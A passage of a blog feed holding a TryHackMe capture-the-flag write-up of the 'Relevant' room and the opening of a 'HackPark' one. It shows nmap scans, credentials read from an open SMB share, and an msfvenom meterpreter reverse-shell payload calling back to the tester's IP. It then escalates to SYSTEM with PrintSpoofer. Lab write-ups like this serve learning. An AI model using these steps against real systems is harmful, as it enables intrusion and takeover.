+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.91.208&lt;span class="se">\C&lt;/span>$:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE_HIDDEN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Default share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.91.208&lt;span class="se">\I&lt;/span>PC$:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_IPC_HIDDEN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Remote IPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.91.208&lt;span class="se">\n&lt;/span>t4wrksv:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Current user access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 36.80 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here I found out a shared folder called nt4wrksv, which can be a user.&lt;/p>
+&lt;p>And when I tried to enter this folder I was able to do that even without a password.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.91.208/nt4wrksv
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\k&lt;/span>ali&lt;span class="o">]&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Sun Dec &lt;span class="m">31&lt;/span> 06:28:38 &lt;span class="m">2023&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Sun Dec &lt;span class="m">31&lt;/span> 06:28:38 &lt;span class="m">2023&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> passwords.txt A &lt;span class="m">98&lt;/span> Sat Jul &lt;span class="m">25&lt;/span> 11:15:33 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7735807&lt;/span> blocks of size 4096. &lt;span class="m">5136298&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I even found a passwords.txt file that I downloaded in my machine to examine&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat passwords.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>User Passwords - Encoded&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Qm9iIC0gIVBAJCRXMHJEITEyMw&lt;/span>&lt;span class="o">==&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>There are two encoded passwords.&lt;/p>
+&lt;p>the first one is encoded in base64:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Bob - !P@&lt;span class="nv">$$&lt;/span>W0rD!123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And it actually is username and password.&lt;/p>
+&lt;p>The second one is:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Bill - Juw4nnaM4n420696969!&lt;span class="nv">$$&lt;/span>$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So, now we have two usernames with password.&lt;/p>
+&lt;p>Unfortunately they don’t work with the other samba folders.&lt;/p>
+&lt;p>So for now I am just going to switch target.&lt;/p>
+&lt;p>I tried using the rdp but even then I couldn’t enter.&lt;/p>
+&lt;p>So now I am going to try to enumerate the directories in the web page.&lt;/p>
+&lt;p>This didn’t go well.&lt;/p>
+&lt;p>So I went and searched for the version of IIS.&lt;/p>
+&lt;p>Using burp I intercepted the request and found this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Server: Microsoft-IIS/10.0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So now that we know the version I am going to search online for some know vulnerabilities.&lt;/p>
+&lt;p>At this point it was clear that I was doing something wrong, so I went back and did another scan, this time with all the ports:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p- -A 10.10.161.53
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-31 07:22 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.161.53
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65527&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Microsoft IIS httpd 10.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Potentially risky methods: TRACE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: IIS Windows Server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-IIS/10.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds Windows Server &lt;span class="m">2016&lt;/span> Standard Evaluation &lt;span class="m">14393&lt;/span> microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server Microsoft Terminal Services
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>Relevant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2023-12-30T12:20:08
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2024-06-30T12:20:08
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2023-12-31T12:27:21+00:00&lt;span class="p">;&lt;/span> -1s from scanner time.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> rdp-ntlm-info:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Target_Name: RELEVANT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS_Domain_Name: RELEVANT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS_Computer_Name: RELEVANT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNS_Domain_Name: Relevant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNS_Computer_Name: Relevant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Product_Version: 10.0.14393
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ System_Time: 2023-12-31T12:26:41+00:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49663/tcp open http Microsoft IIS httpd 10.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-IIS/10.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Potentially risky methods: TRACE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: IIS Windows Server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49667/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49669/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OSs: Windows, Windows Server &lt;span class="m">2008&lt;/span> R2 - 2012&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: -1s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> OS: Windows Server &lt;span class="m">2016&lt;/span> Standard Evaluation &lt;span class="m">14393&lt;/span> &lt;span class="o">(&lt;/span>Windows Server &lt;span class="m">2016&lt;/span> Standard Evaluation 6.3&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Computer name: Relevant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS computer name: RELEVANT&lt;span class="se">\x&lt;/span>&lt;span class="m">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Workgroup: WORKGROUP&lt;span class="se">\x&lt;/span>&lt;span class="m">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ System time: 2023-12-31T04:26:46-08:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-security-mode:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> account_used: guest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> authentication_level: user
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> challenge_response: supported
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ message_signing: disabled &lt;span class="o">(&lt;/span>dangerous, but default&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled but not required
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2023-12-31T12:26:42
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: 2023-12-31T12:20:09
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 265.81 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And I got other 3 ports.&lt;/p>
+&lt;p>First thing that I am going to do is trying open the other web page:&lt;/p>
+&lt;p>Which is the same as the other.&lt;/p>
+&lt;p>Apart that this time I can enter the &lt;code>nt4wrksv&lt;/code> directory that I have found in the samba share. (http://10.10.161.53:49663/nt4wrksv)&lt;/p>
+&lt;p>from the web page I can also access the passwords.txt file. (http://10.10.161.53:49663/nt4wrksv/passwords.txt)&lt;/p>
+&lt;p>And having the privilege to put file using smbclient I was able to open a reverse shell using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.18.20.116 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4555&lt;/span> -f aspx -o rev.aspx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Putting it in the &lt;code>nt4wrksv&lt;/code> shared folder, opening a listener inside metasploit, and navigate in that directory in the browser. (http://10.10.161.53:49663/nt4wrksv/rev.aspx)&lt;/p>
+&lt;p>So now I got a reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">getuid
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server username: IIS APPPOOL&lt;span class="se">\D&lt;/span>efaultAppPool
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First of all I am going to retrieve the flag inside the Bob directory: &lt;code>THM{fdk4ka34vk346ksxfr21tg789ktf45}&lt;/code>&lt;/p>
+&lt;p>Now that I am in I can see the privileges using &lt;code>whoami /priv&lt;/code>.&lt;/p>
+&lt;p>I see that I the SeImpersonatePrivilege is Enabled. So I am going to exploit that.&lt;/p>
+&lt;p>I will do it using &lt;code>PrintSpoofer64.exe.&lt;/code>&lt;/p>
+&lt;p>Which is a tool that can exploit this vulnerability.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PrintSpoofer64.exe -i -c powershell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found privilege: SeImpersonatePrivilege
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Named pipe listening...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> CreateProcessAsUser&lt;span class="o">()&lt;/span> OK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows PowerShell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> &lt;span class="m">2016&lt;/span> Microsoft Corporation. All rights reserved.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nt authority&lt;span class="se">\s&lt;/span>ystem
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And just like that I retrieved the flag in the administrator desktop: &lt;code>THM{1fk5kf469devly1gl320zafgl345pv}&lt;/code>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.notion.so/Relevant-Report-abd044f35721485e867b54a754a2d63c?pvs=21" target="_blank" rel="noopener"
+>Relevant Report&lt;/a>&lt;/p></description></item><item><title>HackPark Writeup THM</title><link>https://simonefelici.github.io/p/hackpark-writeup-thm/</link><pubDate>Thu, 28 Dec 2023 11:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/hackpark-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png" alt="Featured image of post HackPark Writeup THM" />&lt;p>First of all I am going to do a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn &amp;lt;Machine IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> &lt;span class="o">[&lt;/span>https://nmap.org&lt;span class="o">](&lt;/span>https://nmap.org/&lt;span class="o">)&lt;/span> &lt;span class="o">)&lt;/span> at 2023-12-28 05:20 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.100.75
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.054s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 5.97 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I have usend -Pn because the machine does not respond to ping.&lt;/p>
+&lt;p>We can see that it has port 80(web page) and port 3389(rdp) open.&lt;/p>
+&lt;p>For now I am just going to see the web page.&lt;/p>
